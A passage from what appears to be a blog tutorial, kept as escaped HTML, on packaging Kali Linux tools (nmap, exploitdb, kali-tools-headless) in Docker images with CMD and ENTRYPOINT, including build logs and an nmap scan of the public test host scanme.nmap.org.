Step 3/3 : RUN apt-get update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nmap exploitdb
 &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Running &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ca06b3e4b27f
Get:1 http://kali.download/kali kali-rolling InRelease &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;30.5 kB]
Get:2 http://kali.download/kali kali-rolling/contrib amd64 Packages &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;99.4 kB]
Get:3 http://kali.download/kali kali-rolling/main amd64 Packages &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;16.5 MB]
Get:4 http://kali.download/kali kali-rolling/non-free amd64 Packages &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;195 kB]
Fetched 16.8 MB &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5665 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Reading package lists...
Reading package lists...
Building dependency tree...
The following additional packages will be installed:
  libblas3 libicu63 liblinear4 liblua5.3-0 libssh2-1 libssl1.1 libxml2
  libxml2-utils lua-lpeg nmap-common
Suggested packages:
  liblinear-tools liblinear-dev ncat ndiff zenmap
The following NEW packages will be installed:
  exploitdb libblas3 libicu63 liblinear4 liblua5.3-0 libssh2-1 libssl1.1
  libxml2 libxml2-utils lua-lpeg nmap nmap-common
0 upgraded, 12 newly installed, 0 to remove and 10 not upgraded.
Need to get 44.6 MB of archives.
After this operation, 251 MB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 libblas3 amd64 3.9.0-2 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;153 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 libicu63 amd64 63.2-3 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;8296 kB]
Get:3 http://kali.download/kali kali-rolling/main amd64 liblinear4 amd64 2.3.0+dfsg-4 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;43.7 kB]
Get:4 http://kali.download/kali kali-rolling/main amd64 liblua5.3-0 amd64 5.3.3-1.1+b1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;120 kB]
Get:5 http://kali.download/kali kali-rolling/main amd64 libssh2-1 amd64 1.8.0-2.1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;140 kB]
Get:6 http://kali.download/kali kali-rolling/main amd64 libssl1.1 amd64 1.1.1g-1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1543 kB]
Get:7 http://kali.download/kali kali-rolling/main amd64 libxml2 amd64 2.9.10+dfsg-5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;709 kB]
Get:8 http://kali.download/kali kali-rolling/main amd64 libxml2-utils amd64 2.9.10+dfsg-5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;108 kB]
Get:9 http://kali.download/kali kali-rolling/main amd64 lua-lpeg amd64 1.0.2-1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;33.3 kB]
Get:10 http://kali.download/kali kali-rolling/main amd64 nmap-common all 7.80+dfsg1-2kali2 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3952 kB]
Get:11 http://kali.download/kali kali-rolling/main amd64 nmap amd64 7.80+dfsg1-2kali2 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1999 kB]
Get:12 http://kali.download/kali kali-rolling/main amd64 exploitdb all 20200515-0kali1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;27.5 MB]
debconf: delaying package configuration, since apt-utils is not installed
Fetched 44.6 MB &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;4s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;11.5 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Selecting previously unselected package libblas3:amd64.
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Reading database ... 6524 files and directories currently installed.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Preparing to unpack .../00-libblas3_3.9.0-2_amd64.deb ...
Unpacking libblas3:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.9.0-2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package libicu63:amd64.
Preparing to unpack .../01-libicu63_63.2-3_amd64.deb ...
Unpacking libicu63:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;63.2-3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package liblinear4:amd64.
Preparing to unpack .../02-liblinear4_2.3.0+dfsg-4_amd64.deb ...
Unpacking liblinear4:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.3.0+dfsg-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package liblua5.3-0:amd64.
Preparing to unpack .../03-liblua5.3-0_5.3.3-1.1+b1_amd64.deb ...
Unpacking liblua5.3-0:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.3.3-1.1+b1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package libssh2-1:amd64.
Preparing to unpack .../04-libssh2-1_1.8.0-2.1_amd64.deb ...
Unpacking libssh2-1:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.8.0-2.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package libssl1.1:amd64.
Preparing to unpack .../05-libssl1.1_1.1.1g-1_amd64.deb ...
Unpacking libssl1.1:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.1.1g-1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package libxml2:amd64.
Preparing to unpack .../06-libxml2_2.9.10+dfsg-5_amd64.deb ...
Unpacking libxml2:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.9.10+dfsg-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package libxml2-utils.
Preparing to unpack .../07-libxml2-utils_2.9.10+dfsg-5_amd64.deb ...
Unpacking libxml2-utils &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.9.10+dfsg-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package lua-lpeg:amd64.
Preparing to unpack .../08-lua-lpeg_1.0.2-1_amd64.deb ...
Unpacking lua-lpeg:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0.2-1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package nmap-common.
Preparing to unpack .../09-nmap-common_7.80+dfsg1-2kali2_all.deb ...
Unpacking nmap-common &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.80+dfsg1-2kali2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package nmap.
Preparing to unpack .../10-nmap_7.80+dfsg1-2kali2_amd64.deb ...
Unpacking nmap &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.80+dfsg1-2kali2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Selecting previously unselected package exploitdb.
Preparing to unpack .../11-exploitdb_20200515-0kali1_all.deb ...
Unpacking exploitdb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20200515-0kali1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Setting up lua-lpeg:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0.2-1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
Setting up libssl1.1:amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.1.1g-1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
debconf: unable to initialize frontend: Dialog
debconf: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TERM is not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;, so the dialog frontend is not usable.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
debconf: falling back to frontend: Readline
debconf: unable to initialize frontend: Readline
debconf: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Can&lt;span class=&quot;s1&quot;&gt;'t locate Term/ReadLine.pm in @INC (you may need to install the Term::ReadLine module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.30.0 /usr/local/share/perl/5.30.0 /usr/lib/x86_64-linux-gnu/perl5/5.30 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl/5.30 /usr/share/perl/5.30 /usr/local/lib/site_perl /usr/lib/x86_64-linux-gnu/perl-base) at /usr/share/perl5/Debconf/FrontEnd/Readline.pm line 7.)
debconf: falling back to frontend: Teletype
Setting up libicu63:amd64 (63.2-3) ...
Setting up libblas3:amd64 (3.9.0-2) ...
update-alternatives: using /usr/lib/x86_64-linux-gnu/blas/libblas.so.3 to provide /usr/lib/x86_64-linux-gnu/libblas.so.3 (libblas.so.3-x86_64-linux-gnu) in auto mode
Setting up nmap-common (7.80+dfsg1-2kali2) ...
Setting up liblua5.3-0:amd64 (5.3.3-1.1+b1) ...
Setting up libssh2-1:amd64 (1.8.0-2.1) ...
Setting up libxml2:amd64 (2.9.10+dfsg-5) ...
Setting up liblinear4:amd64 (2.3.0+dfsg-4) ...
Setting up libxml2-utils (2.9.10+dfsg-5) ...
Setting up nmap (7.80+dfsg1-2kali2) ...
Setting up exploitdb (20200515-0kali1) ...
Processing triggers for libc-bin (2.30-7) ...
Removing intermediate container ca06b3e4b27f
 ---&amp;gt; a4c12ef59c80
Successfully built a4c12ef59c80
Successfully tagged base:latest
SECURITY WARNING: You are building a Docker image from Windows against a non-Windows Docker host. All files and directories added to build context will have '&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' permissions. It is recommended to double check and reset permissions for sensitive files and directories.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This time when I start up the container:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--privileged&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bash&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I can see I have nmap installed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\SecDevOps\posts\nmapDocker.png&quot; alt=&quot;nmapDocker.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is pretty cool, now I can quickly spin up an nmap capable container on demand.&lt;/p&gt;

&lt;p&gt;Taking it a step further, what if I want to execute nmap commands from the docker container without using invoking a shell? I can use CMD:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot; data-lang=&quot;conf&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Kali Linux base Image to start all Kali builds with
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalilinux&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;rolling&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;LABEL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Description&lt;/span&gt;=&lt;span class=&quot;s2&quot;&gt;&quot;Base Image to start all Kali builds with&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;RUN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; -&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploitdb&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;CMD&lt;/span&gt; [&lt;span class=&quot;s2&quot;&gt;&quot;/usr/bin/nmap&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;--version&quot;&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now when I run it without the bash shell&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-base&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I get the output piped straight into my shell:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Nmap version 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.3 openssl-1.1.1d libssh2-1.8.0 libz-1.2.11 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is really useful for automated testing at scale, as the Dockerfiles can be dynamically generated with specific tools and commands prepared off of the back of CI/CD triggers. Perhaps more useful however is being able to run a specific tool on demand in docker as an executable, this requires an ENTRYPOINT.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot; data-lang=&quot;conf&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Kali Linux Base Image to start all Kali builds with
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalilinux&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;rolling&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;LABEL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Description&lt;/span&gt;=&lt;span class=&quot;s2&quot;&gt;&quot;Base Image to start all Kali builds with&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;RUN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; -&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploitdb&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ENTRYPOINT&lt;/span&gt; [&lt;span class=&quot;s2&quot;&gt;&quot;/usr/bin/nmap&quot;&lt;/span&gt;]
&lt;span class=&quot;n&quot;&gt;CMD&lt;/span&gt; [&lt;span class=&quot;s2&quot;&gt;&quot;--version&quot;&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The above Dockerfile does the following&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Locates the Kali base image and pulls it down locally if required&lt;/li&gt;
  &lt;li&gt;Adds a Descriptive Label for humans to read&lt;/li&gt;
  &lt;li&gt;Updates the apt repos and installs nmap and searchsploit&lt;/li&gt;
  &lt;li&gt;Defines the default execution on a docker run to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap --version&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;At this point running&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Gives me the output I’m expecting:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Nmap version 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.3 openssl-1.1.1d libssh2-1.8.0 libz-1.2.11 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;the &lt;strong&gt;CMD [”–version”]&lt;/strong&gt; represents a default command context which the entry point uses to execute. I can overwrite this with a command of my own.
I want if I wanted to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/nmap -A -T4 scanme.nmap.org&lt;/code&gt; via docker I can over write &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--version&lt;/code&gt; by using the following command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scanme.nmap.org&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This works!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-05-22 13:38 UTC
Warning: 45.33.32.156 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanme.nmap.org &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;45.33.32.156&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.036s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Other addresses &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanme.nmap.org &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not scanned&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 2600:3c01::f03c:91ff:fe18:bb2f
Not shown: 996 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   1024 ac:00:a0:1a:82:ff:cc:55:99:dc:67:2b:34:97:6b:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 20:3d:2d:44:62:2a:b0:5a:9d:b5:b3:05:14:c2:a6:b2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 96:02:bb:5e:57:54:1c:4e:45:2f:56:4c:4a:24:b2:57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 33:fa:91:0f:e0:e1:7b:1f:6d:05:a2:b0:f1:54:41:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http       Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Go ahead and ScanMe!
9929/tcp  open  nping-echo Nping &lt;span class=&quot;nb&quot;&gt;echo
&lt;/span&gt;31337/tcp open  tcpwrapped
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: printer|switch
Running &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JUST GUESSING&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: HP embedded &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Dell embedded &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
OS CPE: cpe:/h:hp:designjet_650c cpe:/h:dell:powerconnect_5424
Aggressive OS guesses: HP DesignJet 650C printer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Dell PowerConnect 5424 switch &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;conditions non-ideal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Network Distance: 2 hops
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 80/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
HOP RTT     ADDRESS
1   0.03 ms 172.17.0.1
2   1.83 ms 45.33.32.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;135.65 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;While this is pretty useful a fully interactive container may be more useful.&lt;/p&gt;

&lt;p&gt;Using the following Dockerfile&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot; data-lang=&quot;conf&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Kali Linux Base Image to start all Kali builds with
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalilinux&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;rolling&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;LABEL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Description&lt;/span&gt;=&lt;span class=&quot;s2&quot;&gt;&quot;Base Image to start all Kali builds with&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;RUN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; -&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;tools&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;headless&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I can build all the packages and start a session with Kali tools that don’t need a GUI&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Simple! This gives me command line version of Kali with most of the tools needed to complete assessments via automation.
